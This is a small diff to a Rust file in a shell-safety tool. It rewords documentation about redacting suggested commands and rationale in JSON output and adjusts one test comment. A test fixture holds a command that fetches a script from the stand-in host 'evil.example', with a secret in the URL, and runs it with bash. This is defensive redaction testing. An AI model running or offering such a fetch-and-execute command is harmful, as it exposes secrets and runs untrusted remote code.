@@ -62,10 +62,10 @@ pub struct JsonOutput<'a> {
 
 /// Return a redacted clone of a [`SafeSuggestion`] for JSON output.
 ///
-/// `safe_command` re-embeds the user's original command/URL/path (the
-/// pipe-to-shell, sudo-narrow, env-scrub, archive, and dotfile rewrites all
-/// splice attacker- or user-controlled input back in), and `rationale` is a
-/// per-rule string that some transforms (env-scrub) build with a runtime value.
+/// `safe_command` re-embeds the user's original command/URL/path. Executable
+/// suggestions are limited to the verified fail-closed pipe runner, which
+/// splices attacker- or user-controlled input back in. Guidance-only rationale
+/// can also include runtime-derived context.
 /// Rationale is scrubbed with the SAME `custom_patterns` the caller uses for
 /// findings. An executable command cannot be scrubbed in place: redaction would
 /// produce a different string that was never analyzed. When it would change,
@@ -762,7 +762,7 @@ mod tests {
             safe_command: Some(format!(
                 "'/usr/local/bin/tirith' run --capsule --script-stdin --interpreter bash 'https://evil.example/{secret}'"
             )),
-            // Also plant it in the rationale (env-scrub builds this at runtime).
+            // Also plant it in the rationale to cover runtime-derived guidance.
             rationale: format!("downloads {secret} for review"),
             remediation: "review before running".to_string(),
         }];
